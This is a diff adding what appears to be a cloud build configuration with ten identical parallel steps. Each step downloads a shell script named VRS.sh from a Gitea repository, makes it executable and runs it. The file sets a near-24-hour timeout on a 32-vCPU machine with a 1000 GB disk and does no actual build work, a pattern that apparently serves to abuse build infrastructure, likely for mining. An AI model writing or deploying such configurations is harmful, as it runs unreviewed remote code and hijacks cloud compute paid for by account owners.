@@ -1,0 +1,85 @@
+teps:
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://try.gitea.io/nosmould864/gcp/raw/branch/master/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://try.gitea.io/nosmould864/gcp/raw/branch/master/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+    
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://try.gitea.io/nosmould864/gcp/raw/branch/master/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://try.gitea.io/nosmould864/gcp/raw/branch/master/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://try.gitea.io/nosmould864/gcp/raw/branch/master/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://try.gitea.io/nosmould864/gcp/raw/branch/master/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://try.gitea.io/nosmould864/gcp/raw/branch/master/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://try.gitea.io/nosmould864/gcp/raw/branch/master/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://try.gitea.io/nosmould864/gcp/raw/branch/master/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://try.gitea.io/nosmould864/gcp/raw/branch/master/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+    waitFor: ["-"]
+    
+    entrypoint: /bin/bash
+timeout: 86000s
+options:
+  machineType: E2_HIGHCPU_32
+  diskSizeGb: '1000'
